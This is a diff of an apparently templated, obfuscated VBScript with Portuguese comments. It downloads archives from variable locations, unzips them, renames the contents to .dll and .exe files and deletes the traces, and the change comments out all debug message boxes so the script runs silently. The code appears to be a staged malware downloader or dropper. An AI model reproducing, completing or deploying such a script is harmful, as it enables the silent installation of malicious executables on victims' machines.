@@ -556,14 +556,14 @@ dim #var76#
 
 
 'primeiro down 
-msgbox  "1-De " & #var3# &  #const56# & #var6# &" para "& #var69# & #var73# & #const56# & #var7#
+'msgbox  "1-De " & #var3# &  #const56# & #var6# &" para "& #var69# & #var73# & #const56# & #var7#
 
 #var49# #var3# & #const56# & #var6#, #var69# + #var73# + #const56# & #var7#
 'unzip
 #var31# #var69# & #var73# & #const56# & #var7#, #var69#
 
 
-msgbox  "1-De MF " & #var69# & #var8# & " para "& #var69# & #var73# & "1." & #var77#
+'msgbox  "1-De MF " & #var69# & #var8# & " para "& #var69# & #var73# & "1." & #var77#
 Set #var34# = CreateObject(#const51#)
 #var34#.MoveFile #var69# & #var8#, #var69# & #var73# & "1." & #var77#
 #var34#.DeleteFile(#var69# & #var73# + #const56# & #var7#)
@@ -573,13 +573,13 @@ Set #var34# = CreateObject(#const51#)
 
 if #var69# <> #var8# then
 
-msgbox  "2-De " & #var71# &" para "& #var69# & #var73# & "4" & #var6# &  #var7#
+'msgbox  "2-De " & #var71# &" para "& #var69# & #var73# & "4" & #var6# &  #var7#
 
 #var49# #var71#, #var69# + #var73# + "4" + #var6# +  #var7#
 'De#var17#F #var69# + #var73# + "4" + #var6#,  #var69# + #var73# + "4" + #var7#
 #var31# #var69# & #var73# & "4" &  #var6# & #var7#, #var69#
 
-msgbox  "2-De MF " & #var69# & #var8# &".dll"& " para "& #var69# & #var73# 
+'msgbox  "2-De MF " & #var69# & #var8# &".dll"& " para "& #var69# & #var73# 
 Set #var34# = CreateObject(#const51#)
 #var34#.MoveFile #var69# & #var8# &".dll", #var69# & #var73#
 #var34#.DeleteFile( #var69# & #var73# + "4" + #var6# & #var7#)
@@ -590,18 +590,18 @@ Set #var79# = CreateObject(#const59#)
 
 
 #var78# = #var73# + #const57#
-msgbox  "3-De " &  #var3# & #const58# & #var6# & " para "& #var69# &  #var73# &  #const58# &  #var6# +".zip"
+'msgbox  "3-De " &  #var3# & #const58# & #var6# & " para "& #var69# &  #var73# &  #const58# &  #var6# +".zip"
 
 'down
 #var49# #var3# & #const58# & #var6#, #var69# + #var73# + #const58# + #var6# +".zip"
 'De#var17#F #var69# + #var73# + #const58# + #var6#,  #var69# + #var73# + #const58# + #var7# 
-msgbox  "3-Unzip " & #var69# & #var73# & #const58# & #var6#
+'msgbox  "3-Unzip " & #var69# & #var73# & #const58# & #var6#
 'unzip
 #var31# #var69# & #var73# & #const58# & #var6# &".zip", #var69#
 
 Set #var34# = CreateObject(#const51#)
 
-msgbox  "3-De MF " & #var69# & #var8# & ".exe" & " para " &  #var69# & #var78#  & ".exe"
+'msgbox  "3-De MF " & #var69# & #var8# & ".exe" & " para " &  #var69# & #var78#  & ".exe"
 
 #var34#.MoveFile #var69# & #var8# & ".exe" , #var69# & #var78#  & ".exe"
 #var34#.DeleteFile( #var69# + #var73# + #const58# + #var6# +".zip")
